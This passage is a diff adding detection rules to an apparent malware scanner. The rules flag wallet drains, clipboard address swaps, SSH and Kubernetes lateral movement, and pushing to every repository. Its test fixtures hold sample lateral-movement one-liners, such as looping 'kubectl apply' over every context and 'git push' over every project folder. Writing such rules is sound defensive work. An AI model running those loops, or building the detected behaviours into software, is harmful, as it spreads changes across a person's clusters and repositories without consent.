+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '\bget-contexts\b[^\n]{0,200}--context\b'
+        - '--context\b[^\n]{0,200}\bget-contexts\b'
+    tests:
+      positive:
+        - "for c in $(kubectl config get-contexts -o name); do kubectl --context $c apply -f m.yaml; done"
+      negative:
+        - "kubectl config get-contexts"
+
+  - id: CAP.RECON.REPOSITORY_LOOP.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: reconnaissance
+    title: Loops over every project folder in the home directory
+    message: This file iterates over the person's project folders rather than working in one.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '\bfor\b[^\n]{0,80}~/(?:projects|repos|src|code|dev|workspace)/\*'
+    tests:
+      positive:
+        - "for d in ~/projects/*/; do (cd \"$d\" && git push -q); done"
+      negative:
+        - "for f in src/*.ts; do echo $f; done"
+
+  - id: CAP.EGRESS.GIT_PUSH.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: egress
+    baseline_hits: 1
+    title: Pushes commits to a git remote
+    message: This file runs `git push`, sending commits to a remote.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '\bgit\b[^\n]{0,60}\bpush\b'
+        - '["\x27]git["\x27]\s*,\s*\[?\s*["\x27]push["\x27]'
+    tests:
+      positive:
+        - "git add -A && git commit -qm update && git push -q"
+      negative:
+        - "git status --short"
+
+  - id: SUSPECT.WALLET.DRAIN_TO_FIXED_ADDRESS.001
+    version: 1.0.0
+    category: suspicious
+    severity: high
+    confidence: medium
+    title: Sends a wallet's balance to an address written into the code
+    message: >
+      This file sends the wallet's balance to a recipient written into the code, using the person's key or a network
+      call to do it. A wallet tool sends to the address the person gives it.
+    remediation: Do not install.
+    evidence_policy: masked
+    match:
+      kind: composite
+      scope: file
+      proximity: 50
+      all:
+        - rule: CAP.WALLET.FIXED_RECIPIENT.001
+        - any:
+            - capability: egress
+            - capability: credential
+
+  - id: SUSPECT.WALLET.UNLIMITED_APPROVAL_FIXED.001
+    version: 1.0.0
+    category: suspicious
+    severity: medium
+    confidence: medium
+    title: Approves a fixed address to spend an unlimited amount of a token
+    message: >
+      This file approves an address written into the code to spend an unlimited amount of the person's tokens, using
+      the person's key. Applications do approve their own contracts; an approval the person did not size is the setup
+      of a drain.
+    remediation: Check the spender is the application's own published contract.
+    evidence_policy: masked
+    match:
+      kind: composite
+      scope: file
+      proximity: 50
+      all:
+        - rule: CAP.WALLET.UNLIMITED_APPROVAL.001
+        - any:
+            - capability: egress
+            - capability: credential
+
+  - id: SUSPECT.WALLET.CLIPBOARD_SWAP.001
+    version: 1.0.0
+    category: suspicious
+    severity: high
+    confidence: high
+    title: Replaces what is on the clipboard with a fixed wallet address
+    message: >
+      This file reads the clipboard and writes a wallet address taken from its own code back onto it: the swap that
+      makes a person paste an attacker's address where they meant their own or their payee's.
+    remediation: Do not install.
+    evidence_policy: masked
+    match:
+      kind: composite
+      scope: file
+      proximity: 20
+      all:
+        - rule: CAP.COLLECT.CLIPBOARD_READ.001
+        - rule: CAP.WALLET.CLIPBOARD_ADDRESS_WRITE.001
+
+  - id: SUSPECT.LATERAL.SSH_KNOWN_HOSTS.001
+    version: 1.0.0
+    category: suspicious
+    severity: high
+    confidence: high
+    title: Runs commands on the hosts the person connects to over SSH
+    message: >
+      This file reads the person's SSH known_hosts list and starts a process on the same line, connecting to those
+      hosts to run a command: spreading from this machine to every server the person uses.
+    remediation: Do not install.
+    evidence_policy: masked
+    match:
+      kind: composite
+      scope: file
+      proximity: 3
+      all:
+        - rule: CAP.RECON.KNOWN_HOSTS.001
+        - capability: spawn
+
+  - id: SUSPECT.LATERAL.KUBE_EVERY_CONTEXT.001
+    version: 1.0.0
+    category: suspicious
+    severity: high
+    confidence: high
+    title: Acts on every Kubernetes cluster the person can reach
+    message: >
+      This file lists every Kubernetes context the person has and runs a command against each, reaching every cluster
+      their credentials open.
+    remediation: Do not install.
+    evidence_policy: masked
+    match:
+      kind: composite
+      scope: file
+      proximity: 3
+      all:
+        - rule: CAP.RECON.KUBE_CONTEXTS.001
+        - capability: spawn
+
+  - id: SUSPECT.LATERAL.PUSH_EVERY_REPOSITORY.001
+    version: 1.0.0
+    category: suspicious
+    severity: high
+    confidence: medium
+    title: Commits and pushes to every repository under the home folder
+    message: >
+      This file loops over the person's project folders and pushes in each, so what it adds reaches every project's
+      remote and everyone who pulls it.
+    remediation: Do not install. Review recent commits in the person's repositories.
+    evidence_policy: masked
+    match:
+      kind: composite
+      scope: file
+      proximity: 3
+      all:
+        - rule: CAP.RECON.REPOSITORY_LOOP.001
+        - rule: CAP.EGRESS.GIT_PUSH.001
